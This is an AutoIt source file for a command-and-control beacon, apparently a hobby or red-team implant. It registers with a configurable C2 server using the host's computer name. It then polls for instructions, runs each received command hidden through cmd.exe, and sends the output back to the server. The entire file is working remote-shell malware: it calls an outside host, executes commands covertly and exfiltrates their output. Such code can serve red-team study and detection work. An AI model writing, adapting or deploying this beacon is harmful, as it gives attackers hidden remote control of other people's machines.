#include <Constants.au3>

;default args
Global $gServer = "127.0.0.1"
Global $gPort = 1234

;defining args
;1st arg = c2 ip
;2nd arg = port number
If $CmdLine[0] >= 1 Then $gServer = $CmdLine[1]
If $CmdLine[0] >= 2 Then $gPort = Number($CmdLine[2])

TCPStartup()

Global $beaconId = _GenerateBeaconId()
Global $computer = @ComputerName

; calls function to register the beacon
_SendAndRecv("register|" & $beaconId & "|" & $computer)

;communications with c2
While 1
    Local $resp = _SendAndRecv("request_action|" & $beaconId)
    If @error Then
        Sleep(3000)
        ContinueLoop
    EndIf

    Switch $resp
        Case "", "no_pending_commands"
            Sleep(5000)

        Case Else
            Local $sepPos = StringInStr($resp, "|")
            Local $cmdType = $resp
            Local $payload = ""

            If $sepPos > 0 Then
                $cmdType = StringLeft($resp, $sepPos - 1)
                $payload = StringMid($resp, $sepPos + 1)
            EndIf

            If $cmdType = "execute_command" Then
                Local $output = _ExecAndCapture($payload)
                ; Fire-and-forget OK for command_output; receiver replies with a short message
                _SendAndRecv("command_output|" & $beaconId & "|" & $output, True)

            ElseIf $cmdType = "shutdown" Then
                Exit

            Else
                ; Unknown command types can be ignored, or you may send a checkin
                _SendAndRecv("checkin|" & $beaconId, True)
            EndIf
    EndSwitch
WEnd

;defining _SendAndRecv
Func _SendAndRecv($msg, $fireAndForget = False)
    Local $sock = TCPConnect($gServer, $gPort) ;socket
    If $sock = -1 Then Return SetError(1, 0, "") ;socket error handling

    TCPSend($sock, $msg)

    If $fireAndForget Then
        TCPCloseSocket($sock)
        Return ""
    EndIf

    Local $data = ""
    Local $idleTimer = TimerInit()

    ; Read until server closes or idle timeout (1s) elapses
    While 1
        Local $chunk = TCPRecv($sock, 8192) ;define receiving chunk size
        If @error Then ExitLoop

        If $chunk <> "" Then ;if there's data/activity, reset timer
            $data &= $chunk
            $idleTimer = TimerInit()
        Else
            If TimerDiff($idleTimer) > 1000 Then ExitLoop
            Sleep(50)
        EndIf
    WEnd

    TCPCloseSocket($sock)
    Return StringStripWS($data, 3)
EndFunc

Func _ExecAndCapture($cmd)
    Local $pid = Run(@ComSpec & " /c " & $cmd, "", @SW_HIDE, $STDOUT_CHILD + $STDERR_CHILD)
    If @error Or $pid = 0 Then Return "[exec error]"

    Local $out = ""
    While 1
        Local $chunk = StdoutRead($pid)
        If @error Then ExitLoop
        If $chunk <> "" Then $out &= $chunk

        If Not ProcessExists($pid) Then
            $out &= StdoutRead($pid) ; flush remaining buffer
            ExitLoop
        EndIf
        Sleep(50)
    WEnd
    Return $out
EndFunc

Func _GenerateBeaconId()
    ; Simple pseudo-unique ID: random hex + process ID
    Local $rnd = Hex(Random(0, 0xFFFFFF, 1), 6)
    Local $pid = Hex(@AutoItPID, 4)
    Return StringLower($rnd & $pid)
EndFunc
